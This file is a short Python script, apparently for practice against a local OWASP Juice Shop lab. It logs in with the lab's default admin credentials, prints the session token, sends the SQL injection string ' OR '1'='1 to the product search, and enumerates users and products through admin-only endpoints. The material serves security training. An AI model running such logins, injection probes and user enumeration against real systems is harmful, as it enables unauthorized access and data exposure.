import requests

# -------------------------------
# Configuration (Juice Shop Local Lab)
# -------------------------------
JUICE_SHOP_URL = "http://localhost:3000"
LOGIN_URL = f"{JUICE_SHOP_URL}/rest/user/login"
USERS_URL = f"{JUICE_SHOP_URL}/rest/admin/users"  # admin-only lab endpoint
PRODUCTS_URL = f"{JUICE_SHOP_URL}/rest/products/search"

USERNAME = "admin@juice-sh.op"
PASSWORD = "admin123"

# -------------------------------
# Start session
# -------------------------------
session = requests.Session()

# -------------------------------
# Helper function to safely extract JSON
# -------------------------------
def extract_api_output(response):
    try:
        return response.json()
    except Exception:
        return "[!] Could not parse API output"

# -------------------------------
# Step 1: Log in
# -------------------------------
login_data = {"email": USERNAME, "password": PASSWORD}
resp = session.post(LOGIN_URL, json=login_data)

if resp.status_code != 200:
    print("[!] Login failed")
    exit()

token = resp.json().get("authentication", {}).get("token")
if not token:
    print("[!] Could not get JWT token")
    exit()

print("[+] Logged in successfully!")
print(f"[+] JWT token: {token}\n")

# -------------------------------
# Step 2: Fetch own profile
# -------------------------------
headers = {"Authorization": f"Bearer {token}"}
profile_url = f"{JUICE_SHOP_URL}/rest/user/whoami"
resp = session.get(profile_url, headers=headers)
print("[+] Profile info:")
print(extract_api_output(resp), "\n")

# -------------------------------
# Step 3: Simulate simple SQLi test (safe lab)
# -------------------------------
params = {"q": "' OR '1'='1"}  # safe search test
resp = session.get(PRODUCTS_URL, params=params)
print("[+] Products search output (SQLi test simulation):")
print(extract_api_output(resp), "\n")

# -------------------------------
# Step 4: Enumerate users (admin-only)
# -------------------------------
resp = session.get(USERS_URL, headers=headers)
print("[+] Users info (admin-only):")
print(extract_api_output(resp), "\n")

# -------------------------------
# Step 5: Enumerate products (safe lab)
# -------------------------------
resp = session.get(f"{JUICE_SHOP_URL}/rest/products", headers=headers)
print("[+] Products list:")
print(extract_api_output(resp), "\n")

# -------------------------------
# Step 6: (Optional) enumerate categories
# -------------------------------
categories_url = f"{JUICE_SHOP_URL}/rest/Category"
resp = session.get(categories_url, headers=headers)
print("[+] Categories list:")
print(extract_api_output(resp), "\n")
